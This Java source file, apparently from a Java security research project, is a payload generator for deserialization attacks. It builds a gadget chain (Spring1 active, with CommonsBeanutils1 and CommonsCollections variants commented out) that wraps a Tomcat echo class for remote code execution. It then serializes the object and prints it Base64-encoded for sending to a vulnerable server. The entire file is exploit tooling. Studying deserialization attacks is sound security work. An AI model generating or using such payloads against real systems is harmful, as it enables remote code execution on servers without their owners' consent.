package com.pacemrc.javasec;

import com.pacemrc.javasec.Gadgets.*;
import com.pacemrc.javasec.rcecho.TomcatEcho;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class GeneratePayload {

    public static void main(String[] args) throws Exception {

//        Object obj = CB1.getObj(TomcatEcho.class);
//        Object obj = CC2.getObj(TomcatEcho.class);
//        Object obj = CC3.getObj(TomcatEcho.class);
//        Object obj = CC4.getObj(TomcatEcho.class);
        Object obj = Spring1.getObj(TomcatEcho.class);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();
        bos.close();

        byte[] bytes = bos.toByteArray();
        String s = Base64.getEncoder().encodeToString(bytes).replaceAll("\\+","-");
        System.out.println(s);

    }
}
